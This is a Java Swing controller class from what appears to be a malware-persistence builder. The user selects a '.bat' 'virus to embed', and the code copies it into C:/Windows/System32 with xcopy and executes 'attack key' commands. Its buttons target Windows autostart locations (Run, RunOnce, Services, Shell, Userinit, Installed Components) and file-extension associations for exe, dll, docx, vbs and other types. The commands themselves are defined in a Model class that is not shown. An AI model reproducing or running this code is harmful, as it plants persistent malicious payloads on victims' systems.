package com.company.Controller;

import com.company.Model.Model;
import com.company.View.ButtonClass;
import com.company.View.Data;
import com.company.View.View;

import javax.swing.*;
import java.awt.event.MouseEvent;
import java.awt.event.MouseListener;
import java.io.*;

public class Controller{
    private View view;
    private Model model;

    private ButtonClass requestA;
    private JButton requestB;
    private String virusChosenFrom;
    private File attacker;

    public Controller() throws IOException, NullPointerException {
        view = new View();
        model = new Model();

        view.addMouseListener(new GlobalListener());
        LocalListener listener = new LocalListener();

        view.AttackInstalledComponentsKey.addMouseListener(listener);
        view.AttackUserInitKey.addMouseListener(listener);
        view.AttackServicesKey.addMouseListener(listener);
        view.AttackRunOnceKey.addMouseListener(listener);
        view.AttackShellKey.addMouseListener(listener);
        view.AttackLoadKey.addMouseListener(listener);
        view.AttackRunKey.addMouseListener(listener);
        view.GetAllPsKey.addMouseListener(listener);
        view.ModifyCurrentExtKey.addMouseListener(listener);

        view.modpanel.exeFiles.addMouseListener(listener);
        view.modpanel.dllFiles.addMouseListener(listener);
        view.modpanel.docxFiles.addMouseListener(listener);
        view.modpanel.htmlFiles.addMouseListener(listener);
        view.modpanel.regFiles.addMouseListener(listener);
        view.modpanel.textFiles.addMouseListener(listener);
        view.modpanel.vbsFiles.addMouseListener(listener);
        view.modpanel.xmlFiles.addMouseListener(listener);

        view.search.addMouseListener(listener);
        view.attack.addMouseListener(listener);
        view.exit.addMouseListener(listener);
        view.aboutDev.addMouseListener(listener);
    }

    private void   toCheckReplace(MouseEvent e){
        view.setX(e.getX());
        view.setY(e.getY());

        if (view.getX()< Data.frameWidth && view.getY()<75)
        {
            view.setPressed(true);
            view.setReplaced(true);
            view.setBounds(view.getBounds().x-(view.getX()-e.getX()),view.getBounds().y-(view.getY()-e.getY()),Data.frameWidth,Data.frameHeight);
        }
    }
    private void   toFixReplace(MouseEvent e){
        if (view.isPressed() && view.isReplaced()) {
            view.setBounds(view.getBounds().x - (view.getX() - e.getX()), view.getBounds().y - (view.getY() - e.getY()), Data.frameWidth, Data.frameHeight);
            view.setReplaced(false);
            view.setPressed(false);
        }
    }
    private void   toExecuteCommand(String command) throws IOException, InterruptedException {

        try{
            Process pr = Runtime.getRuntime().exec("cmd /c xcopy "+attacker.getAbsolutePath()+" C:/Windows/System32  /f /i /y /s");
                         Runtime.getRuntime().exec(command);

            BufferedReader input = new BufferedReader(new InputStreamReader(pr.getInputStream()));
            String line = null;

            while ((line = input.readLine()) != null)
                System.out.println(line);


            int exitVal = pr.waitFor();
            System.out.println("Exited with error code " + exitVal);
            }
            catch(Exception e1){
            System.out.println(e1.toString());
            e1.printStackTrace();
            }
    }
    private String toGetClass(String sent){
        int k = sent.indexOf('[');
        return sent.substring(0,k);
    }

    class GlobalListener implements MouseListener {
        @Override
        public void mouseClicked(MouseEvent e) {

        }
        @Override
        public void mousePressed(MouseEvent e) {

            toCheckReplace(e);
        }
        @Override
        public void mouseReleased(MouseEvent e) {
            toFixReplace(e);

        }
        @Override
        public void mouseEntered(MouseEvent e) {

        }
        @Override
        public void mouseExited(MouseEvent e) {


        }

    }
    class LocalListener implements MouseListener {
        @Override
        public void mouseClicked(MouseEvent e) {

        }
        @Override
        public void mousePressed(MouseEvent e) {

            requestA = new ButtonClass();
            requestB = new JButton();

            System.out.println(toGetClass(e.getComponent().toString()));

            if (toGetClass(e.getComponent().toString()).equals("javax.swing.JButton"))  requestB = (JButton) e.getSource();
            else if (toGetClass(e.getComponent().toString()).equals("com.company.View.ButtonClass"))  requestA = (ButtonClass) e.getSource();


            if (requestA == view.AttackInstalledComponentsKey)
            {
                view.AttackInstalledComponentsKey.setPressed(!view.AttackInstalledComponentsKey.isPressed());
                view.AttackInstalledComponentsKey.setChangedBounds();
            }


            if (requestA == view.AttackUserInitKey)
            {
                view.AttackUserInitKey.setPressed(!view.AttackUserInitKey.isPressed());
                view.AttackUserInitKey.setChangedBounds();
            }


            if (requestA == view.AttackServicesKey)
            {
                view.AttackServicesKey.setPressed(!view.AttackServicesKey.isPressed());
                view.AttackServicesKey.setChangedBounds();
            }


            if (requestA == view.AttackRunOnceKey)
            {
                view.AttackRunOnceKey.setPressed(!view.AttackRunOnceKey.isPressed());
                view.AttackRunOnceKey.setChangedBounds();
            }


            if (requestA == view.AttackShellKey)
            {
                view.AttackShellKey.setPressed(!view.AttackShellKey.isPressed());
                view.AttackShellKey.setChangedBounds();
            }


            if (requestA == view.AttackLoadKey)
            {
                view.AttackLoadKey.setPressed(!view.AttackLoadKey.isPressed());
                view.AttackLoadKey.setChangedBounds();
            }


            if (requestA == view.AttackRunKey)
            {
                view.AttackRunKey.setPressed(!view.AttackRunKey.isPressed());
                view.AttackRunKey.setChangedBounds();
            }


            if (requestA == view.GetAllPsKey)
            {
                view.GetAllPsKey.setPressed(!view.GetAllPsKey.isPressed());
                view.GetAllPsKey.setChangedBounds();
            }


            if (requestA == view.ModifyCurrentExtKey)
            {
                view.ModifyCurrentExtKey.setPressed(!view.ModifyCurrentExtKey.isPressed());
                view.ModifyCurrentExtKey.setChangedBounds();
            }

            if (requestA == view.modpanel.exeFiles)
            {
                view.modpanel.exeFiles.setPressed(!view.modpanel.exeFiles.isPressed());
                view.modpanel.exeFiles.setChangedBounds();
            }

            if (requestA == view.modpanel.dllFiles)
            {
                view.modpanel.dllFiles.setPressed(!view.modpanel.dllFiles.isPressed());
                view.modpanel.dllFiles.setChangedBounds();
            }


            if (requestA == view.modpanel.docxFiles)
            {
                view.modpanel.docxFiles.setPressed(!view.modpanel.docxFiles.isPressed());
                view.modpanel.docxFiles.setChangedBounds();
            }


            if (requestA == view.modpanel.htmlFiles)
            {
                view.modpanel.htmlFiles.setPressed(!view.modpanel.htmlFiles.isPressed());
                view.modpanel.htmlFiles.setChangedBounds();
            }


            if (requestA == view.modpanel.regFiles)
            {
                view.modpanel.regFiles.setPressed(!view.modpanel.regFiles.isPressed());
                view.modpanel.regFiles.setChangedBounds();
            }


            if (requestA == view.modpanel.textFiles)
            {
                view.modpanel.textFiles.setPressed(!view.modpanel.textFiles.isPressed());
                view.modpanel.textFiles.setChangedBounds();
            }

            if (requestA == view.modpanel.vbsFiles)
            {
                view.modpanel.vbsFiles.setPressed(!view.modpanel.vbsFiles.isPressed());
                view.modpanel.vbsFiles.setChangedBounds();
            }

            if (requestA == view.modpanel.xmlFiles)
            {
                view.modpanel.xmlFiles.setPressed(!view.modpanel.xmlFiles.isPressed());
                view.modpanel.xmlFiles.setChangedBounds();
            }



            if (requestB == view.exit)
            {
                if (!view.exit.isOpaque()) {
                    view.exit.setOpaque(true);
                    view.exit.setBounds(view.exit.getX(), view.exit.getY() + 2, view.exit.getWidth(), view.exit.getHeight());
                }
            }

            if (requestB == view.aboutDev){
                if (!view.aboutDev.isOpaque()){
                    view.aboutDev.setOpaque(true);
                    view.aboutDev.setBounds(view.aboutDev.getX(), view.aboutDev.getY() + 2, view.aboutDev.getWidth(), view.aboutDev.getHeight());
                }
            }
        }
        @Override
        public void mouseReleased(MouseEvent e) {

            requestA = new ButtonClass();
            requestB = new JButton();

                if (toGetClass(e.getComponent().toString()).equals("javax.swing.JButton"))  requestB = (JButton) e.getSource();
                else if (toGetClass(e.getComponent().toString()).equals("com.company.View.ButtonClass"))  requestA = (ButtonClass) e.getSource();

            if (requestA == view.AttackInstalledComponentsKey)
                if (view.AttackInstalledComponentsKey.isPressed())
                {
                    view.AttackInstalledComponentsKey.setChangedBoundsBack();
                    view.AttackInstalledComponentsKey.setPressed(!view.AttackInstalledComponentsKey.isPressed());
                    if (view.isModPanelVisible()) {view.toModSetsPanelInvisible(); view.ModifyCurrentExtKey.setOpened(false);}

                    if (!view.AttackInstalledComponentsKey.isOpened())
                    {
                        view.AttackInstalledComponentsKey.setOpened(!view.AttackInstalledComponentsKey.isOpened());
                        if (!view.isIAreaVisible()) view.toIAreaVisible();
                        virusChosenFrom = "AttackInstalledComponentsKey";
                    }
                    else
                    {
                        view.AttackInstalledComponentsKey.setOpened(!view.AttackInstalledComponentsKey.isOpened());
                        if (view.isIAreaVisible()) view.toIAreaInvisible();
                        virusChosenFrom = "";
                    }
                }


            if (requestA == view.AttackUserInitKey)
                if (view.AttackUserInitKey.isPressed())
                {
                    view.AttackUserInitKey.setChangedBoundsBack();
                    view.AttackUserInitKey.setPressed(!view.AttackUserInitKey.isPressed());
                    if (view.isModPanelVisible()) {view.toModSetsPanelInvisible(); view.ModifyCurrentExtKey.setOpened(false);}

                    if (!view.AttackUserInitKey.isOpened())
                    {
                        view.AttackUserInitKey.setOpened(!view.AttackUserInitKey.isOpened());
                        if (!view.isIAreaVisible()) view.toIAreaVisible();
                        virusChosenFrom = "AttackUserInitKey";
                    }
                    else
                    {
                        view.AttackUserInitKey.setOpened(!view.AttackUserInitKey.isOpened());
                        if (view.isIAreaVisible()) view.toIAreaInvisible();
                        virusChosenFrom = "";
                    }
                }


            if (requestA == view.AttackServicesKey)
                if (view.AttackServicesKey.isPressed())
                {
                    view.AttackServicesKey.setChangedBoundsBack();
                    view.AttackServicesKey.setPressed(!view.AttackServicesKey.isPressed());
                    if (view.isModPanelVisible()) {view.toModSetsPanelInvisible(); view.ModifyCurrentExtKey.setOpened(false);}

                    if (!view.AttackServicesKey.isOpened())
                    {
                        view.AttackServicesKey.setOpened(!view.AttackServicesKey.isOpened());
                        if (!view.isIAreaVisible()) view.toIAreaVisible();
                        virusChosenFrom = "AttackServicesKey";
                    }
                    else
                    {
                        view.AttackServicesKey.setOpened(!view.AttackServicesKey.isOpened());
                        if (view.isIAreaVisible()) view.toIAreaInvisible();
                        virusChosenFrom = "";
                    }
                }


            if (requestA == view.AttackRunOnceKey)
                if (view.AttackRunOnceKey.isPressed())
                {
                    view.AttackRunOnceKey.setChangedBoundsBack();
                    view.AttackRunOnceKey.setPressed(!view.AttackRunOnceKey.isPressed());
                    if (view.isModPanelVisible()) {view.toModSetsPanelInvisible(); view.ModifyCurrentExtKey.setOpened(false);}

                    if (!view.AttackRunOnceKey.isOpened())
                    {
                        view.AttackRunOnceKey.setOpened(!view.AttackRunOnceKey.isOpened());
                        if (!view.isIAreaVisible()) view.toIAreaVisible();
                        virusChosenFrom = "AttackRunOnceKey";
                    }
                    else
                    {
                        view.AttackRunOnceKey.setOpened(!view.AttackRunOnceKey.isOpened());
                        if (view.isIAreaVisible()) view.toIAreaInvisible();
                        virusChosenFrom = "";
                    }
                }


            if (requestA == view.AttackShellKey)
                if (view.AttackShellKey.isPressed())
                {
                    view.AttackShellKey.setChangedBoundsBack();
                    view.AttackShellKey.setPressed(!view.AttackShellKey.isPressed());
                    if (view.isModPanelVisible()) {view.toModSetsPanelInvisible(); view.ModifyCurrentExtKey.setOpened(false);}

                    if (!view.AttackShellKey.isOpened())
                    {
                        view.AttackShellKey.setOpened(!view.AttackShellKey.isOpened());
                        if (!view.isIAreaVisible()) view.toIAreaVisible();
                        virusChosenFrom = "AttackShellKey";
                    }
                    else
                    {
                        view.AttackShellKey.setOpened(!view.AttackShellKey.isOpened());
                        if (view.isIAreaVisible()) view.toIAreaInvisible();
                        virusChosenFrom = "";
                    }
                }


            if (requestA == view.AttackLoadKey)
                if (view.AttackLoadKey.isPressed())
                {
                    view.AttackLoadKey.setChangedBoundsBack();
                    view.AttackLoadKey.setPressed(!view.AttackLoadKey.isPressed());
                    if (view.isModPanelVisible()) {view.toModSetsPanelInvisible(); view.ModifyCurrentExtKey.setOpened(false);}

                    if (!view.AttackLoadKey.isOpened())
                    {
                        view.AttackLoadKey.setOpened(!view.AttackLoadKey.isOpened());
                        if (!view.isIAreaVisible()) view.toIAreaVisible();
                        virusChosenFrom = "AttackLoadKey";
                    }
                    else
                    {
                        view.AttackLoadKey.setOpened(!view.AttackLoadKey.isOpened());
                        if (view.isIAreaVisible()) view.toIAreaInvisible();
                        virusChosenFrom = "";
                    }
                }


            if (requestA == view.AttackRunKey)
                if (view.AttackRunKey.isPressed())
                {
                    view.AttackRunKey.setChangedBoundsBack();
                    view.AttackRunKey.setPressed(!view.AttackRunKey.isPressed());
                    if (view.isModPanelVisible()) {view.toModSetsPanelInvisible(); view.ModifyCurrentExtKey.setOpened(false);}

                    if (!view.AttackRunKey.isOpened())
                    {
                        view.AttackRunKey.setOpened(!view.AttackRunKey.isOpened());
                        if (!view.isIAreaVisible()) view.toIAreaVisible();
                        virusChosenFrom = "AttackRunKey";
                    }
                    else
                    {
                        view.AttackRunKey.setOpened(!view.AttackRunKey.isOpened());
                        if (view.isIAreaVisible())  view.toIAreaInvisible();
                        virusChosenFrom = "";
                    }
                }


            if (requestA == view.GetAllPsKey)
                if (view.GetAllPsKey.isPressed())
                {
                    if (view.isModPanelVisible()) {view.toModSetsPanelInvisible(); view.ModifyCurrentExtKey.setOpened(false);}
                    if (view.isIAreaVisible()) view.toIAreaInvisible();

                 try {
                     Process pr = Runtime.getRuntime().exec(model.getAttackKey("GetAllPsKey"));
                     }
                     catch (IOException e1) {e1.printStackTrace();}


                    view.GetAllPsKey.setChangedBoundsBack();
                    view.GetAllPsKey.setPressed(!view.GetAllPsKey.isPressed());
                }


            if (requestA == view.ModifyCurrentExtKey)
                if (view.ModifyCurrentExtKey.isPressed())
                {
                    view.ModifyCurrentExtKey.setChangedBoundsBack();
                    view.ModifyCurrentExtKey.setPressed(!view.ModifyCurrentExtKey.isPressed());
                    if (view.isModPanelVisible()) view.toModSetsPanelInvisible();

                    if (!view.ModifyCurrentExtKey.isOpened())
                    {
                        view.ModifyCurrentExtKey.setOpened(!view.ModifyCurrentExtKey.isOpened());
                        if (view.isIAreaVisible()) {view.toIAreaInvisible(); view.toSetAllKeysClosed(0);}
                        if (!view.isModPanelVisible()) view.toModSetsPanelVisible();
                    }
                    else
                    {
                        view.ModifyCurrentExtKey.setOpened(!view.ModifyCurrentExtKey.isOpened());
                        if (view.isModPanelVisible())  view.toModSetsPanelInvisible();
                    }
                }




            if (requestA == view.modpanel.exeFiles)
                if (view.modpanel.exeFiles.isPressed())
                {
                    view.modpanel.exeFiles.setChangedBoundsBack();
                    view.modpanel.exeFiles.setPressed(!view.modpanel.exeFiles.isPressed());
                    view.modpanel.exeFiles.setOpened(!view.modpanel.exeFiles.isOpened());

                    if (view.isModPanelVisible()) view.toModSetsPanelInvisible();
                    view.ModifyCurrentExtKey.setOpened(!view.ModifyCurrentExtKey.isOpened());
                    if (!view.isIAreaVisible()) view.toIAreaVisible();
                    virusChosenFrom = "exeFiles";
                }

            if (requestA == view.modpanel.docxFiles)
                if (view.modpanel.docxFiles.isPressed())
                {
                    view.modpanel.docxFiles.setChangedBoundsBack();
                    view.modpanel.docxFiles.setPressed(!view.modpanel.docxFiles.isPressed());
                    view.modpanel.docxFiles.setOpened(!view.modpanel.docxFiles.isOpened());

                    if (view.isModPanelVisible()) view.toModSetsPanelInvisible();
                    view.ModifyCurrentExtKey.setOpened(!view.ModifyCurrentExtKey.isOpened());
                    if (!view.isIAreaVisible()) view.toIAreaVisible();
                    virusChosenFrom = "docxFiles";
                }


            if (requestA == view.modpanel.xmlFiles)
                if (view.modpanel.xmlFiles.isPressed())
                {
                    view.modpanel.xmlFiles.setChangedBoundsBack();
                    view.modpanel.xmlFiles.setPressed(!view.modpanel.xmlFiles.isPressed());
                    view.modpanel.xmlFiles.setOpened(!view.modpanel.xmlFiles.isOpened());

                    if (view.isModPanelVisible()) view.toModSetsPanelInvisible();
                    view.ModifyCurrentExtKey.setOpened(!view.ModifyCurrentExtKey.isOpened());
                    if (!view.isIAreaVisible()) view.toIAreaVisible();
                    virusChosenFrom = "xmlFiles";
                }




            if (requestA == view.modpanel.vbsFiles)
                if (view.modpanel.vbsFiles.isPressed())
                {
                    view.modpanel.vbsFiles.setChangedBoundsBack();
                    view.modpanel.vbsFiles.setPressed(!view.modpanel.vbsFiles.isPressed());
                    view.modpanel.vbsFiles.setOpened(!view.modpanel.vbsFiles.isOpened());

                    if (view.isModPanelVisible()) view.toModSetsPanelInvisible();
                    view.ModifyCurrentExtKey.setOpened(!view.ModifyCurrentExtKey.isOpened());
                    if (!view.isIAreaVisible()) view.toIAreaVisible();
                    virusChosenFrom = "vbsFiles";
                }




            if (requestA == view.modpanel.textFiles)
                if (view.modpanel.textFiles.isPressed())
                {
                    view.modpanel.textFiles.setChangedBoundsBack();
                    view.modpanel.textFiles.setPressed(!view.modpanel.textFiles.isPressed());
                    view.modpanel.textFiles.setOpened(!view.modpanel.textFiles.isOpened());

                    if (view.isModPanelVisible()) view.toModSetsPanelInvisible();
                    view.ModifyCurrentExtKey.setOpened(!view.ModifyCurrentExtKey.isOpened());
                    if (!view.isIAreaVisible()) view.toIAreaVisible();
                    virusChosenFrom = "textFiles";
                }




            if (requestA == view.modpanel.regFiles)
                if (view.modpanel.regFiles.isPressed())
                {
                    view.modpanel.regFiles.setChangedBoundsBack();
                    view.modpanel.regFiles.setPressed(!view.modpanel.regFiles.isPressed());
                    view.modpanel.regFiles.setOpened(!view.modpanel.regFiles.isOpened());

                    if (view.isModPanelVisible()) view.toModSetsPanelInvisible();
                    view.ModifyCurrentExtKey.setOpened(!view.ModifyCurrentExtKey.isOpened());
                    if (!view.isIAreaVisible()) view.toIAreaVisible();
                    virusChosenFrom = "regFiles";
                }




            if (requestA == view.modpanel.htmlFiles)
                if (view.modpanel.htmlFiles.isPressed())
                {
                    view.modpanel.htmlFiles.setChangedBoundsBack();
                    view.modpanel.htmlFiles.setPressed(!view.modpanel.htmlFiles.isPressed());
                    view.ModifyCurrentExtKey.setOpened(!view.ModifyCurrentExtKey.isOpened());
                    view.modpanel.htmlFiles.setOpened(!view.modpanel.htmlFiles.isOpened());

                    if (view.isModPanelVisible()) view.toModSetsPanelInvisible();
                    if (!view.isIAreaVisible()) view.toIAreaVisible();
                    virusChosenFrom = "htmlFiles";
                }




            if (requestA == view.modpanel.dllFiles)
                if (view.modpanel.dllFiles.isPressed())
                {
                    view.modpanel.dllFiles.setChangedBoundsBack();
                    view.modpanel.dllFiles.setPressed(!view.modpanel.dllFiles.isPressed());
                    view.modpanel.dllFiles.setOpened(!view.modpanel.dllFiles.isOpened());

                    if (view.isModPanelVisible()) view.toModSetsPanelInvisible();
                    view.ModifyCurrentExtKey.setOpened(!view.ModifyCurrentExtKey.isOpened());
                    if (!view.isIAreaVisible()) view.toIAreaVisible();
                    virusChosenFrom = "dllFiles";
                }






            if (requestB == view.search){

                JFileChooser dialog = new JFileChooser();
                dialog.setFileFilter(new filter(".bat","bat files"));
                dialog.setFileSelectionMode(JFileChooser.FILES_AND_DIRECTORIES);
                dialog.setApproveButtonText("Choose this virus");//выбрать название для кнопки согласия
                dialog.setDialogTitle("Select the virus to embed");// выбрать название
                dialog.setDialogType(JFileChooser.OPEN_DIALOG);// выбрать тип диалога Open или Save
                dialog.showOpenDialog(view);
                File virus = dialog.getSelectedFile();
                attacker = virus;

                view.setAreaText(virus.getAbsolutePath());
            }

            if (requestB == view.attack){

               if (attacker != null && attacker.getName().endsWith(".bat"))
               {
                  view.setAreaText("Ready!");

                  try {
                      view.toSetAllKeysClosed(1);

                      toExecuteCommand(model.getAttackKey(virusChosenFrom));
                      }
                      catch (IOException e1) {e1.printStackTrace();}
                      catch (InterruptedException e2) {e2.printStackTrace();}


                   view.toIAreaInvisible();
                   view.toModSetsPanelInvisible();
                   virusChosenFrom = "";

               }
               else view.setAreaText("File is not chosen or invalid!");
               }

            if (requestB == view.exit)
            {
                if (view.exit.isOpaque()) {
                    view.exit.setOpaque(false);
                    view.exit.setBounds(view.exit.getX(), view.exit.getY() - 2, view.exit.getWidth(), view.exit.getHeight());
                    System.exit(0);
                }
            }


            if (requestB == view.aboutDev)
            {
                if (view.aboutDev.isOpaque()) {
                    view.aboutDev.setOpaque(false);
                    view.aboutDev.setBounds(view.aboutDev.getX(), view.aboutDev.getY() - 2, view.aboutDev.getWidth(), view.aboutDev.getHeight());

                    if (!view.devInfoPanel.isOpened()){
                        view.devInfoPanel.setOpened(!view.devInfoPanel.isOpened());
                        view.toInfoVisible();
                    }
                    else
                    {
                    view.devInfoPanel.setOpened(!view.devInfoPanel.isOpened());
                    view.toInfoInvisible();
                    }

                }
            }
        }
        @Override
        public void mouseEntered(MouseEvent e) {

        }
        @Override
        public void mouseExited(MouseEvent e) {


        }
    }

    public class filter extends javax.swing.filechooser.FileFilter {
        String ext,description;
        public String getDescription() {

            return description;
        }
        filter(String ext, String description) {

            this.ext = ext;
        }
        public boolean accept(File f) {
            if(f != null) {
                if (f.isDirectory()) {
                    return true;
                }

                return f.toString().endsWith(ext);
            }
            return false;
        }
    }
}